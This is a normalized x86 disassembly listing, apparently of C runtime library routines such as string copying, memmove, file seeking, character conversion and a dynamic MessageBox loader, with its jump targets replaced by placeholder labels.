mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4061c0
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_410d98
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_404d8e
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_40b0d0
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40b14a
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_404e6b
pop ecx
cmp eax ebx
je r-xdata
call sub_410f50
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_40ec82
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40eac8
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40ecc4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_404e6b
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_40ed09
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4117ab
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40ed55
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40571f
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_40eda3
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4118c9
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40edf5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_404d8e
push [ esi + 0x8 ]
call sub_404d8e
push [ esi + 0xc ]
call sub_404d8e
push [ esi + 0x10 ]
call sub_404d8e
push [ esi + 0x14 ]
call sub_404d8e
push [ esi + 0x18 ]
call sub_404d8e
push [ esi ]
call sub_404d8e
push [ esi + 0x20 ]
call sub_404d8e
push [ esi + 0x24 ]
call sub_404d8e
push [ esi + 0x28 ]
call sub_404d8e
push [ esi + 0x2c ]
call sub_404d8e
push [ esi + 0x30 ]
call sub_404d8e
push [ esi + 0x34 ]
call sub_404d8e
push [ esi + 0x1c ]
call sub_404d8e
push [ esi + 0x38 ]
call sub_404d8e
push [ esi + 0x3c ]
call sub_404d8e
add esp 0x40
push [ esi + 0x40 ]
call sub_404d8e
push [ esi + 0x44 ]
call sub_404d8e
push [ esi + 0x48 ]
call sub_404d8e
push [ esi + 0x4c ]
call sub_404d8e
push [ esi + 0x50 ]
call sub_404d8e
push [ esi + 0x54 ]
call sub_404d8e
push [ esi + 0x58 ]
call sub_404d8e
push [ esi + 0x5c ]
call sub_404d8e
push [ esi + 0x60 ]
call sub_404d8e
push [ esi + 0x64 ]
call sub_404d8e
push [ esi + 0x68 ]
call sub_404d8e
push [ esi + 0x6c ]
call sub_404d8e
push [ esi + 0x70 ]
call sub_404d8e
push [ esi + 0x74 ]
call sub_404d8e
push [ esi + 0x78 ]
call sub_404d8e
push [ esi + 0x7c ]
call sub_404d8e
add esp 0x40
push [ esi + 0x80 ]
call sub_404d8e
push [ esi + 0x84 ]
call sub_404d8e
push [ esi + 0x88 ]
call sub_404d8e
push [ esi + 0x8c ]
call sub_404d8e
push [ esi + 0x90 ]
call sub_404d8e
push [ esi + 0x94 ]
call sub_404d8e
push [ esi + 0x98 ]
call sub_404d8e
push [ esi + 0x9c ]
call sub_404d8e
push [ esi + 0xa0 ]
call sub_404d8e
push [ esi + 0xa4 ]
call sub_404d8e
push [ esi + 0xa8 ]
call sub_404d8e
add esp 0x2c
sub_40ef8a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404d8e
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404d8e
pop ecx
push esi
call sub_404d8e
pop ecx
sub_40efcf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404d8e
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404d8e
pop ecx
push esi
call sub_404d8e
pop ecx
sub_40f05d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_407f64
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_407f64
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_407efc
add esp 0x14
mov eax esi
jmp r-xdata
sub_40f0e0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_40f126
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_407f64
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_407f64
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_407efc
add esp 0x14
mov eax esi
jmp r-xdata
sub_40f1db
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_407f64
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_407f64
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_407efc
add esp 0x14
mov eax esi
jmp r-xdata
sub_40f250
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40f298
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_4108d2
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_407f64
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_407f8a
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_40f31d
push 0x14
push r--data
call sub_4099f4
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_407f77
and [ eax ] 0x0
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] edi
call sub_407f64
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_407efc
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_409a39
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_410949
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_407f77
mov [ eax ] edi
call sub_407f64
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_407efc
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f298
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f42c
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_40f436
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_40ecc4
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_40f47f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_407f64
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_407efc
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_40f4e3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_407f64
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_407efc
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_407f64
mov [ eax ] 0x2a
call sub_407f64
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_407f64
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_407efc
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_40b0d0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_40b0d0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40f670
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40f710
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40f798 ]
jmp [ ecx * 4 + jump_table_40f818 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40f884 ]
pop esi
pop edi
pop ebp
jmp sub_411003
jmp [ ecx * 4 + jump_table_40fa20 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40f924 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fa20 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40f884 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40fa20 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40f884 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40f884 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40f884 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fa20 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fa20 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40fa20 ]
sub_40fa75
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_407785
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_40778e
pop ecx
test eax eax
je r-xdata
push eax
call sub_40778e
pop ecx
test eax eax
je r-xdata
push eax
call sub_40778e
push [ rw-data ]
mov esi eax
call sub_40778e
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_407713
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_407713
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_407713
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_407713
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_407713
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_40778e
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_40fbde
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_40fc30
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40fc64
push 0x10
push r--data
call sub_4099f4
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fcfa
mov eax [ ebp - 0x1c ]
call sub_409a39
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
